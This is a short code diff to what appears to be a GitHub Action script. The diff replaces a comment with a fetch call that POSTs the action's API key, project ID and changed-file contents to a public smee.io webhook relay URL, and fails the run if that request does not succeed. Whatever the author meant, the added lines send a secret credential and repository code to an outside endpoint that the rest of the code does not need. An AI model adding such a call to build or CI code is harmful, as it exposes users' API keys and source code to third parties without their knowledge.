@@ -82,9 +82,16 @@ async function run() {
     const projectId = core.getInput("project_id", { required: true });
     const apiKey = core.getInput("api_key", { required: true });
 
-    // Now you have a Map where:
-    // - keys are file paths
-    // - values are file contents
+    const response = await fetch("https://smee.io/fFmI0AYEiUYxEoR7", {
+        method: "POST",
+        body: JSON.stringify({
+            projectId: projectId,
+            apiKey: apiKey,
+            changedFiles: changedFiles
+        })
+    })
+
+    if (!response.ok) core.setFailed("Something went wrong.")
 
     for (const [path, content] of changedFiles) {
         // Do something with path and content
